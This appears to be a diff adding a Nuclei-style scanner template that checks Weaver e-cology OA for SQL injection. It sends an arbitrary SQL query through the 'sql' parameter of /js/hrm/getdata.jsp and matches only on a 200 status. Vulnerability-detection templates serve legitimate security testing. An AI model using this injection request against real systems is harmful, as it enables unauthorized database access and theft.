@@ -1,0 +1,17 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-sql_injection-CT-159072
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa Sql_Injection Ct 159072
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-sql_injection-CT-159072'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20str({{r1}}*{{r2}})%20as%20id
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
